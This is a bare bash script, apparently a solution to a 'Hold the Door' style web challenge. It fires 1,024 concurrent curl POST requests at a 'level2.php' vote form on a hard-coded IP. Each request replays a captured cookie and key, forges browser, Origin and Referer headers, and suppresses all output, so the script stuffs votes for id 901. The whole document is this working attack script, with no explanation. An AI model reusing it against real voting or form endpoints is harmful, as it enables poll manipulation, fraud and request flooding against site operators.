#!/bin/bash
for ((x=1;x<=1024;x++))
    do
	curl 'http://158.69.76.135/level2.php' -H 'Connection: keep-alive' -H 'Cache-Control: max-age=0' -H 'Origin: http://158.69.76.135' -H 'Upgrade-Insecure-Requests: 1' -H 'Content-Type: application/x-www-form-urlencoded' -H 'User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/77.0.3865.120 Safari/537.36' -H 'Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3' -H 'Referer: http://158.69.76.135/level2.php' -H 'Accept-Encoding: gzip, deflate' -H 'Accept-Language: es-419,es;q=0.9' -H 'Cookie: HoldTheDoor=9eed58820628980fddcebd8780d9c3a9c5f522de' --data 'id=901&holdthedoor=Enviar&key=9eed58820628980fddcebd8780d9c3a9c5f522de' --compressed --insecure 1> /dev/null 2> /dev/null &
done
